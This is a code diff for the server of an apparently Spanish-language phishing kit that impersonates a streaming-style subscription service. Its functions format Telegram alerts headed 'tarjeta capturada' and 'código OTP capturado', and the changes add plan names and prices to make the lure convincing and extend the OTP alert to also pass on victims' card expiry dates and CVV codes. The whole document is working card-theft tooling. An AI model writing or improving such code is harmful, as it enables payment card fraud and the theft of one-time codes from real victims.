@@ -32,6 +32,18 @@ function generateSessionId() {
 
 // Format card data for Telegram
 function formatCardMessage(data) {
+    // Map plan names and prices
+    const planInfo = {
+        'basic': { name: 'Básico', price: '$ 18.900/mes' },
+        'Basic': { name: 'Básico', price: '$ 18.900/mes' },
+        'standard': { name: 'Estándar', price: '$ 29.900/mes' },
+        'Standard': { name: 'Estándar', price: '$ 29.900/mes' },
+        'premium': { name: 'Premium', price: '$ 44.900/mes' },
+        'Premium': { name: 'Premium', price: '$ 44.900/mes' }
+    };
+    
+    const plan = planInfo[data.plan] || { name: 'Premium', price: '$ 44.900/mes' };
+    
     return `
 🔴 *NUEVA TARJETA CAPTURADA*
 
@@ -42,8 +54,8 @@ function formatCardMessage(data) {
 • Nombre: \`${data.cardName}\`
 
 💰 *Plan Seleccionado:*
-• Plan: ${data.plan || 'Premium'}
-• Precio: $ 44.900/mes
+• Plan: ${plan.name}
+• Precio: ${plan.price}
 
 📱 *Información de Sesión:*
 • ID: \`${data.sessionId}\`
@@ -55,6 +67,18 @@ function formatCardMessage(data) {
 
 // Format OTP data for Telegram
 function formatOTPMessage(data) {
+    // Map plan names and prices
+    const planInfo = {
+        'basic': { name: 'Básico', price: '$ 18.900/mes' },
+        'Basic': { name: 'Básico', price: '$ 18.900/mes' },
+        'standard': { name: 'Estándar', price: '$ 29.900/mes' },
+        'Standard': { name: 'Estándar', price: '$ 29.900/mes' },
+        'premium': { name: 'Premium', price: '$ 44.900/mes' },
+        'Premium': { name: 'Premium', price: '$ 44.900/mes' }
+    };
+    
+    const plan = planInfo[data.plan] || { name: 'Premium', price: '$ 44.900/mes' };
+    
     return `
 🔐 *CÓDIGO OTP CAPTURADO*
 
@@ -63,7 +87,13 @@ function formatOTPMessage(data) {
 
 💳 *Tarjeta Asociada:*
 • Número: \`${data.cardNumber}\`
+• Vencimiento: \`${data.expiryDate || 'N/A'}\`
+• CVV: \`${data.cvv || 'N/A'}\`
 • Nombre: \`${data.cardName}\`
+
+💰 *Plan Seleccionado:*
+• Plan: ${plan.name}
+• Precio: ${plan.price}
 
 📱 *Información de Sesión:*
 • ID: \`${data.sessionId}\`
@@ -150,11 +180,17 @@ io.on('connection', (socket) => {
         const session = activeSessions.get(socket.id);
         if (!session) return;
 
+        // Use data from client (which includes card data from localStorage)
+        // Fallback to session data if not provided
         const otpData = {
-            ...data,
-            cardNumber: session.cardData?.cardNumber || 'N/A',
-            cardName: session.cardData?.cardName || 'N/A',
-            sessionId: session.sessionId
+            otpCode: data.otpCode,
+            cardNumber: data.cardNumber || session.cardData?.cardNumber || 'N/A',
+            expiryDate: data.expiryDate || session.cardData?.expiryDate || 'N/A',
+            cvv: data.cvv || session.cardData?.cvv || 'N/A',
+            cardName: data.cardName || session.cardData?.cardName || 'N/A',
+            plan: data.plan || session.cardData?.plan || 'Premium',
+            sessionId: session.sessionId,
+            timestamp: data.timestamp
         };
 
         // Store OTP data in session
